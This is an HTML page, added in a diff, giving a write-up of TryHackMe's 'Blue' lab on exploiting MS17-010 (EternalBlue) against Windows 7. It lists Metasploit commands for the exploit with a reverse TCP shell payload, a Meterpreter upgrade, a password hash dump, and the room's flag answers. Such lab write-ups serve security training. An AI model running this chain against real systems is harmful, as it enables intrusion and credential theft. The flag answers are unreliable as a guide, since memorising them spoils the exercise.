@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blue Room Write‑Up | TryHackMe</title>
+  <link rel="stylesheet" href="../style.css"/>
+</head>
+<body>
+  <div class="hero">
+    <h1>Blue Room – TryHackMe Write‑Up</h1>
+    <a href="../index.html">← Home</a>
+  </div>
+  <div class="section">
+    <h2>Overview</h2>
+    <p>Target is a Windows 7 lab vulnerable to MS17‑010 (EternalBlue).</p>
+  </div>
+  <div class="section">
+    <h2>🧰 Tools Used</h2>
+    <p>Nmap, Metasploit, Meterpreter, hashdump (Meterpreter), John/CrackStation</p>
+  </div>
+  <div class="section">
+    <h2>1. Recon</h2>
+    <pre><code>nmap -sV -sC -p 0-1000 $IP</code></pre>
+  </div>
+  <div class="section">
+    <h2>2. Gaining Access</h2>
+    <pre><code>msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS $IP
+set payload windows/x64/shell/reverse_tcp
+run</code></pre>
+  </div>
+  <div class="section">
+    <h2>3. Privilege Escalation</h2>
+    <pre><code>background
+use post/multi/manage/shell_to_meterpreter
+set SESSION [session_id]
+run</code></pre>
+  </div>
+  <div class="section">
+    <h2>4. Hash Dump & Crack</h2>
+    <pre><code>meterpreter > hashdump</code></pre>
+  </div>
+  <div class="section">
+    <h2>5. Finding Flags</h2>
+    <ul>
+      <li><strong>Flag1:</strong> flag{access_the_machine}</li>
+      <li><strong>Flag2:</strong> sam_database_elevated_access</li>
+      <li><strong>Flag3:</strong> dmin_documents_can_be_valuable</li>
+    </ul>
+  </div>
+  <footer><p>Return <a href="../index.html">Home</a></p></footer>
+</body>
+</html>
